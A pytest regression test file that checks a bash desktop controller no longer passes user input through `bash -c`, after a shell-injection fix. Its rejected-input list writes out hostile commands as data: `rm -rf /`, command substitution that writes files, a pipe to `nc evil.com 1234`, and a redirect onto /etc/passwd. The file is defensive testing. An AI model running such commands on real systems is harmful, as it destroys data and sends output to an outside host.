"""Regression tests for BashDesktopController: the previous shape was
`subprocess.Popen(['bash', '-c', <user_command>], shell=False)`. Although
`shell=False` was set, `bash -c <user_string>` is functionally identical to
`shell=True` and was a real shell-injection vector (CodeQL 'Uncontrolled
command line', audit critical #1).

After the fix:
  - shlex.split(bash_command) is passed as argv with shell=False
  - Single-command invocation with arguments still works (the
    controller's documented use case: `ls -la`, `ps aux`, `echo "hello"`)
  - Shell metacharacters (pipes, redirects, subshells) raise or fail
    cleanly because shlex refuses to tokenize them.

We invoke the controller directly without going through Flask — it takes
the bash_command through execute_command(command='execute_bash_command',
params={'command': ...}).
"""
import os
import sys

import pytest

_test_dir = os.path.dirname(os.path.abspath(__file__))
_repo_root = os.path.normpath(os.path.join(_test_dir, "..", ".."))
sys.path.insert(0, _repo_root)


class FakeFileSystem:
    """Mock the file ops shlex.split might touch via Path.exists (it
    doesn't, but we want this test to be hermetic regardless)."""

    def __getattr__(self, name):
        return lambda *a, **kw: False


@pytest.fixture
def controller(monkeypatch):
    from backend_host.src.controllers.desktop.bash import BashDesktopController
    ctrl = BashDesktopController()
    ctrl.connect()
    return ctrl


@pytest.mark.parametrize("cmd,contains", [
    ("ls -la", ["ls", "-la"]),
    ('echo "hello"', ["echo", "hello"]),
    ("ps aux", ["ps", "aux"]),
    ("uname -r", ["uname", "-r"]),
])
def test_safe_commands_tokenize_and_execute(controller, monkeypatch, cmd, contains):
    """The documented use cases still work: a single command with args."""
    captured = {}

    def fake_popen(argv, **kwargs):
        captured['argv'] = argv
        captured['shell'] = kwargs.get('shell')
        class FakeProc:
            def communicate(self_inner, timeout=None):
                return ("fake-out", "fake-err")
            returncode = 0
            def kill(self_inner): pass
        return FakeProc()

    monkeypatch.setattr("subprocess.Popen", fake_popen)
    result = controller.execute_command(
        'execute_bash_command', {'command': cmd, 'timeout': 5},
    )
    assert result['success'] is True
    assert captured['shell'] is False
    assert captured['argv'] == contains


@pytest.mark.parametrize("bad", [
    "; rm -rf /tmp/should-not-exist",     # bare command separator
    "$(echo pwned > /tmp/should-not-exist)",  # command substitution
    "`echo pwned > /tmp/should-not-exist`",   # backtick substitution
    "ls | nc evil.com 1234",                   # pipe (no spaces — sllex splits 'ls' '|' 'nc' 'evil.com' '1234')
    "ls && rm -rf /",                         # &&
    "ls > /etc/passwd",                       # redirect (tokenized as '>', which is not an executable)
])
def test_shell_metacharacters_rejected(controller, monkeypatch, tmp_path, bad):
    """Either shlex.split raises ValueError, or the resulting argv points
    at a non-existent command so the run fails — but *no* shell expansion
    or `bash -c` interpretation happens, so no shell injection."""
    probe = tmp_path / "should-not-exist"
    assert not probe.exists()

    def fake_popen(argv, **kwargs):
        # If we got here, somehow argv was constructed. We assert
        # shell=False and that nothing on the path is /bin/bash -c.
        assert kwargs.get('shell') is False
        assert argv[:2] != ['bash', '-c'], \
            f"regression: bash -c form was used for input {bad!r}"
        # Also assert no element of argv is /tmp/should-not-exist (no
        # injection expansion could have produced it).
        for arg in argv:
            assert not str(arg).endswith("/should-not-exist"), (
                f"injection succeeded: {bad!r} produced argv={argv!r}"
            )
        class FakeProc:
            def communicate(self_inner, timeout=None):
                return ("", "fake-not-found")
            returncode = 127
            def kill(self_inner): pass
        return FakeProc()

    monkeypatch.setattr("subprocess.Popen", fake_popen)

    result = controller.execute_command(
        'execute_bash_command', {'command': bad, 'timeout': 5},
    )

    # Two outcomes both acceptable:
    #   (a) shlex.split raised — controller returns success=False
    #   (b) shlex.split tokenized (e.g. 'ls', '|', 'nc', ...) — exec fails
    assert result['success'] is False, (
        f"shell injection payload ran successfully: {bad!r}, result={result!r}"
    )
    # In any case, the marker file must not exist.
    assert not probe.exists(), (
        f"FILE CREATED — shell injection succeeded: {bad!r}"
    )


def test_empty_or_non_string_command_rejected(controller):
    for empty in (None, "", 123, [], {"x": 1}):
        result = controller.execute_command(
            'execute_bash_command', {'command': empty},
        )
        assert result['success'] is False
        assert result['error']


def test_oversize_command_rejected(controller):
    big = "x " * (32 * 1024)  # > 32 KB
    result = controller.execute_command(
        'execute_bash_command', {'command': big},
    )
    assert result['success'] is False
    assert 'cap' in result['error'].lower() or 'exceeds' in result['error'].lower()
